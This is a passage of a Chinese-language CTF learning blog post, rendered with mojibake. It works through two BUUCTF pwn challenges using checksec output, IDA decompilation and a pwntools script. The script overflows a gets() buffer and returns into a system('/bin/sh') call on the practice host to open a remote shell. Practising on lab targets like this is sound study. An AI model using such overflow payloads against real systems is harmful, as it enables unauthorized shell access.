<!doctype html><html lang=zh-CN dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="å°ç™½åˆè¯•pwnï¼Œä¼šå­¦ä¼šå—ã€‚ã€‚25.12 çœ‹æ¥æ˜¯æ— åŠŸè€Œè¿”äº†ã€‚ã€‚"><title>ã€CTFã€‘pwnå­¦ä¹ ä¹‹è·¯</title><link rel=canonical href=https://blog.wuko.top/posts/2025/05/21/pwnpwnpwn.html/><link rel=stylesheet href=/scss/style.min.833d6eed45de56f48306bf57268d5b8cdfc8a60e8e7bdc99810464fcd033f7c6.css><meta property='og:title' content="ã€CTFã€‘pwnå­¦ä¹ ä¹‹è·¯"><meta property='og:description' content="å°ç™½åˆè¯•pwnï¼Œä¼šå­¦ä¼šå—ã€‚ã€‚25.12 çœ‹æ¥æ˜¯æ— åŠŸè€Œè¿”äº†ã€‚ã€‚"><meta property='og:url' content='https://blog.wuko.top/posts/2025/05/21/pwnpwnpwn.html/'><meta property='og:site_name' content="wuko's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:published_time' content='2025-05-21T00:00:00+00:00'><meta property='article:modified_time' content='2025-05-21T00:00:00+00:00'><meta property='og:image' content='https://blog.wuko.top/posts/2025/05/21/pwnpwnpwn.html/cover.jpg'><meta name=twitter:title content="ã€CTFã€‘pwnå­¦ä¹ ä¹‹è·¯"><meta name=twitter:description content="å°ç™½åˆè¯•pwnï¼Œä¼šå­¦ä¼šå—ã€‚ã€‚25.12 çœ‹æ¥æ˜¯æ— åŠŸè€Œè¿”äº†ã€‚ã€‚"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://blog.wuko.top/posts/2025/05/21/pwnpwnpwn.html/cover.jpg'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=åˆ‡æ¢èœå•>
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_af0a7c4a31bebdf7.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a><span class=emoji>ğŸ’­</span></figure><div class=site-meta><h1 class=site-name><a href=/>wuko's blog</a></h1><h2 class=site-description>ä»é›¶å¼€å§‹ï¼Œç”±å¿ƒè€Œå‘ã€‚æ¬¢è¿å…±åŒäº¤æµå­¦ä¹ ï¼</h2></div></header><ol class=menu-social><li><a href=https://github.com/wuko233 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com/@Arair237 target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/pages/about.html/><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-vocabulary"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 19H4a1 1 0 01-1-1V4a1 1 0 011-1h6a2 2 0 012 2 2 2 0 012-2h6a1 1 0 011 1v14a1 1 0 01-1 1h-6a2 2 0 00-2 2 2 2 0 00-2-2z"/><path d="M12 5v16"/><path d="M7 7h1"/><path d="M7 11h1"/><path d="M16 7h1"/><path d="M16 11h1"/><path d="M16 15h1"/></svg>
<span>About</span></a></li><li><a href=/pages/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/pages/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/pages/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/pages/money/><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-tip-jar"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M14 10h-2.5a1.5 1.5.0 000 3h1a1.5 1.5.0 010 3H10"/><path d="M12 9v1"/><path d="M12 16v1"/><path d="M17 4v1.882c0 .685.387 1.312 1 1.618s1 .933 1 1.618V18a3 3 0 01-3 3H8a3 3 0 01-3-3V9.118c0-.685.387-1.312 1-1.618s1-.933 1-1.618V4"/><path d="M6 4h12z"/></svg>
<span>Donate</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>æš—è‰²æ¨¡å¼</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">ç›®å½•</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#test_your_nc>test_your_nc</a></li><li><a href=#rip>rip</a></li><li><a href=#warmup_csaw_2016>warmup_csaw_2016</a></li><li><a href=#ciscn_2019_n_1-æ”¹å€¼>ciscn_2019_n_1 ï¼ˆæ”¹å€¼ï¼‰</a></li><li><a href=#pwn1_sctf_2016-fgets>pwn1_sctf_2016 (fgets())</a></li><li><a href=#jarvisoj_level0-read>jarvisoj_level0 (read())</a></li><li><a href=#ç¬¬äº”ç©ºé—´2019-å†³èµ›pwn5-å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´>[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5 (å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´)</a></li><li><a href=#jarvisoj_level2>jarvisoj_level2</a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/posts/2025/05/21/pwnpwnpwn.html/><img src=/posts/2025/05/21/pwnpwnpwn.html/cover_hu_bb9f66c9ff0404cf.jpg srcset="/posts/2025/05/21/pwnpwnpwn.html/cover_hu_bb9f66c9ff0404cf.jpg 800w, /posts/2025/05/21/pwnpwnpwn.html/cover_hu_7f651e857e87bda1.jpg 1600w" width=800 height=483 loading=lazy alt="Featured image of post ã€CTFã€‘pwnå­¦ä¹ ä¹‹è·¯"></a></div><div class=article-details><header class=article-category><a href=/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ style=background-color:#2a9d8f;color:#fff>ç½‘ç»œå®‰å…¨</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/posts/2025/05/21/pwnpwnpwn.html/>ã€CTFã€‘pwnå­¦ä¹ ä¹‹è·¯</a></h2><h3 class=article-subtitle>å°ç™½åˆè¯•pwnï¼Œä¼šå­¦ä¼šå—ã€‚ã€‚25.12 çœ‹æ¥æ˜¯æ— åŠŸè€Œè¿”äº†ã€‚ã€‚</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2025-05-21T00:00:00Z>May 21, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>é˜…è¯»æ—¶é•¿: 12 åˆ†é’Ÿ</time></div></footer></div></header><section class=article-content><p>åˆå­¦è€…ã€‚ã€‚ç”¨äºè®°å½•å­¦ä¹ è¿‡ç¨‹ä¸ç¬”è®°ã€‚</p><h2 id=test_your_nc>test_your_nc</h2><p>å…ˆç”¨<code>checksec</code>æ£€æŸ¥ä¸‹ï¼š</p><p><img src=/posts/2025/05/21/pwnpwnpwn.html/1-1.png width=1882 height=157 srcset="/posts/2025/05/21/pwnpwnpwn.html/1-1_hu_e3c2d6c54aeca693.png 480w, /posts/2025/05/21/pwnpwnpwn.html/1-1_hu_bf10e3604426127e.png 1024w" loading=lazy alt=checksec1 class=gallery-image data-flex-grow=1198 data-flex-basis=2876px></p><ol><li><p><strong>RELRO</strong><br><code>Partial</code> â†’ GOT è¡¨å¯å†™ï¼ˆæ˜“è¢« <code>GOT overwrite</code> æ”»å‡»ï¼‰ã€‚<code>Full</code> æ—¶ GOT åªè¯»æ›´å®‰å…¨ã€‚</p></li><li><p><strong>STACK CANARY</strong><br><code>æœªå¯ç”¨</code> â†’ æ ˆæº¢å‡ºæ— æ£€æµ‹ï¼Œå¯ç›´æ¥è¦†ç›–è¿”å›åœ°å€ã€‚å¯ç”¨åæ ˆç ´åä¼šå´©æºƒã€‚</p></li><li><p><strong>NX</strong><br><code>å¼€å¯</code> â†’ æ ˆ/å †ä¸å¯æ‰§è¡Œã€‚</p></li><li><p><strong>PIE</strong><br><code>å¼€å¯</code> â†’ ä»£ç åœ°å€éšæœºåŒ–ï¼Œéœ€æ³„éœ²åœ°å€ã€‚å…³é—­åˆ™åœ°å€å›ºå®šã€‚</p></li><li><p><strong>RPATH/RUNPATH</strong><br><code>æœªè®¾ç½®</code> â†’ æ— é¢å¤–åº“è·¯å¾„ï¼Œé™ä½åŠ«æŒé£é™©ã€‚</p></li><li><p><strong>Symbols</strong><br><code>64</code> â†’ ä¿ç•™ç¬¦å·ï¼ˆå‡½æ•°åç­‰ï¼‰ï¼Œæ˜“é€†å‘åˆ†æã€‚</p></li><li><p><strong>FORTIFY</strong><br><code>æœªå¯ç”¨</code> â†’ æ— å †æ ˆä¿æŠ¤ã€‚</p></li></ol><p>å†æ‹–åˆ°<code>IDA Pro</code>é‡Œçœ‹çœ‹:</p><p><img src=/posts/2025/05/21/pwnpwnpwn.html/1-2.png width=948 height=169 srcset="/posts/2025/05/21/pwnpwnpwn.html/1-2_hu_2f6bd30fcc236cdb.png 480w, /posts/2025/05/21/pwnpwnpwn.html/1-2_hu_e0f8bac57d0aca10.png 1024w" loading=lazy alt=ida1 class=gallery-image data-flex-grow=560 data-flex-basis=1346px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__fastcall</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ç›´æ¥è°ƒç”¨<code>system()</code>å‡½æ•°è¿›å…¥shellï¼Œæ‰€ä»¥ç›´æ¥ä½¿ç”¨<code>netcat</code>è¿æ¥é¶æœºï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc ip port
</span></span></code></pre></td></tr></table></div></div><p><img src=/posts/2025/05/21/pwnpwnpwn.html/1-3.png width=1186 height=1004 srcset="/posts/2025/05/21/pwnpwnpwn.html/1-3_hu_df26e22eb82f79ba.png 480w, /posts/2025/05/21/pwnpwnpwn.html/1-3_hu_870bba6598b049b1.png 1024w" loading=lazy alt=nc1 class=gallery-image data-flex-grow=118 data-flex-basis=283px></p><p>å‘ç°ç›´æ¥è¿æ¥ä¸Šäº†ï¼Œæ ¹ç›®å½•å°±æœ‰flagï¼Œå¾—åˆ°ï¼š<code>flag{b6588539-d35f-4fde-b2b9-8c56d7fb66bd}</code></p><h2 id=rip>rip</h2><p><code>checksec</code>åˆ†æï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>â¯ checksec --file<span class=o>=</span>./pwn1
</span></span><span class=line><span class=cl>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable   FILE
</span></span><span class=line><span class=cl>Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   <span class=m>64</span> Symbols        No    <span class=m>0</span>               <span class=m>1</span>    ./pwn1
</span></span></code></pre></td></tr></table></div></div><p><code>IDA Pro</code>åˆ†æä¸»å‡½æ•°ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__fastcall</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>s</span><span class=p>[</span><span class=mi>15</span><span class=p>];</span> <span class=c1>// [rsp+1h] [rbp-Fh] BYREF
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;please input&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>gets</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>argv</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;ok,bye!!!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>åŒæ—¶æ³¨æ„åˆ°<code>fun()</code>å‡½æ•°ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>fun</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><code>gets()</code>å‡½æ•°ä¸æ£€æŸ¥è¾“å…¥é•¿åº¦ï¼Œæ‰€ä»¥å¯åˆ©ç”¨å…¶æ¥æº¢å‡º<code>s</code>ï¼Œåˆ°è¾¾shellcodeä¹Ÿå°±æ˜¯<code>fun()</code>ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401186</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401186</span> <span class=c1>; Attributes: bp-based frame
</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401186</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401186</span> <span class=c1>; int fun()
</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401186</span>                 <span class=nf>public</span> <span class=no>fun</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401186</span> <span class=nf>fun</span>             <span class=no>proc</span> <span class=no>near</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401186</span> <span class=c1>; __unwind {
</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401186</span>                 <span class=nf>push</span>    <span class=no>rbp</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401187</span>                 <span class=nf>mov</span>     <span class=no>rbp</span><span class=p>,</span> <span class=no>rsp</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>000000000040118</span><span class=nf>A</span>                 <span class=no>lea</span>     <span class=no>rdi</span><span class=p>,</span> <span class=no>command</span>    <span class=c1>; &#34;/bin/sh&#34;
</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401191</span>                 <span class=nf>call</span>    <span class=no>_system</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401196</span>                 <span class=nf>nop</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401197</span>                 <span class=nf>pop</span>     <span class=no>rbp</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401198</span>                 <span class=nf>retn</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401198</span> <span class=c1>; } // starts at 401186
</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401198</span> <span class=nf>fun</span>             <span class=no>endp</span>
</span></span></code></pre></td></tr></table></div></div><p>æ³¨æ„åˆ°shellcodeä½äº<code>40118A</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è®©å…¶æ‰§è¡Œè¿™ä¸ªåœ°å€çš„å‘½ä»¤ã€‚</p><p>é‚£ä¹ˆå¦‚ä½•æº¢å‡ºå‘¢ï¼Ÿé¦–å…ˆè¦å¡«æ»¡<code>s[15]</code>ï¼Œä¹Ÿå°±æ˜¯15ä¸ªå­—èŠ‚ï¼Œä¸æ­¤åŒæ—¶ï¼Œè¿˜éœ€è¦æ·»åŠ 8ä¸ªå­—èŠ‚æ¥é¡¶æ‰åŸºæŒ‡é’ˆå¯„å­˜å™¨<code>rbp;</code>ï¼š</p><blockquote><p>rbp (Base Pointer Register) æ˜¯x86-64æ¶æ„ä¸­çš„åŸºæŒ‡é’ˆå¯„å­˜å™¨,ç”¨äºæ ‡è®°å½“å‰å‡½æ•°æ ˆå¸§çš„èµ·å§‹ä½ç½®
æ¯ä¸ªå‡½æ•°è°ƒç”¨éƒ½ä¼šåœ¨æ ˆä¸Šä¿å­˜å‰ä¸€ä¸ªå‡½æ•°çš„RBPå€¼ ,
è¿™ä¸ªä¿å­˜æ“ä½œå ç”¨å›ºå®šçš„8å­—èŠ‚ç©ºé—´,
åœ¨ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ä¸­ï¼Œè¿™8å­—èŠ‚æ˜¯è¦†ç›–è¿”å›åœ°å€å‰å¿…é¡»è¶Šè¿‡çš„æœ€åä¸€ä¸ªå±éšœ,
x86æ¶æ„æ˜¯4å­—èŠ‚ï¼Œx64æ¶æ„æ˜¯8å­—èŠ‚ â†’ è¿™æ˜¯64ä½ç³»ç»Ÿçš„å…³é”®ç‰¹å¾</p></blockquote><p>æ‰€ä»¥æ„å»ºpayloadï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=mi>23</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x40118A</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>å…ˆå‘é€23ä¸ªqä½¿å…¶æº¢å‡ºï¼Œåé¢æ¥ä¸Šshellcode<code>fun()</code>ä¸­ç»ˆç«¯å‡½æ•°çš„åœ°å€ï¼Œå°è¯•è¿›å…¥shellã€‚</p><blockquote><p><code>p64()</code> æ˜¯ Python ä¸­ <strong>pwntools</strong> åº“çš„æ ¸å¿ƒå‡½æ•°ï¼Œç”¨äºå°†æ•´æ•°è½¬æ¢ä¸º<strong>64ä½å°ç«¯åºå­—èŠ‚åºåˆ—</strong>ã€‚åœ¨ pwn æ¼æ´åˆ©ç”¨ä¸­ï¼Œå®ƒç”¨äºç²¾ç¡®æ„é€ å†…å­˜åœ°å€æ ¼å¼çš„ payloadã€‚</p></blockquote><p>æœ€ç»ˆç¨‹åºï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;node5.buuoj.cn&#34;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>25983</span>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=mi>23</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x40118A</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>è¯¦è§£ï¼š</p><p>æ–°å»ºä¸€ä¸ª<code>sh</code>å¯¹è±¡ï¼Œç”¨äºè¿æ¥é¶æœºä»¥åŠæ“ä½œé¶æœºï¼›</p><blockquote><p><strong>remote()å‡½æ•°</strong>ï¼špwntoolsçš„æ ¸å¿ƒå‡½æ•°ï¼Œç”¨äºåˆ›å»ºTCPè¿æ¥
<code>sendline()</code>å‘é¶æœºå‘é€payload;</p></blockquote><blockquote><p><strong>sendline()</strong>ï¼šå‘é€æ•°æ®å¹¶åœ¨æœ«å°¾è‡ªåŠ¨æ·»åŠ  <code>\n</code>ï¼ˆ0x0Aï¼‰
é‡è¦ï¼šå› ä¸ºåŸç¨‹åºä½¿ç”¨ <code>gets()</code> å‡½æ•°ï¼Œè¯¥å‡½æ•°ä»¥ <code>\n</code> æˆ– EOF ä¸ºç»“æŸæ ‡å¿—</p></blockquote><blockquote><p><strong>interactive()</strong>ï¼šä½œç”¨ï¼šåœ¨æ”»å‡»æˆåŠŸåè¿›å…¥äº¤äº’å¼shell</p></blockquote><p><strong>å‘é€å†…å®¹</strong>ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>qqqqqqqqqqqqqqqqqqqqqqq + \x8A\x11\x40\x00\x00\x00\x00\x00 + \n
</span></span></code></pre></td></tr></table></div></div><p>æ‰§è¡Œï¼Œè·å–åˆ°äº†shellï¼Œè·å¾—flagï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
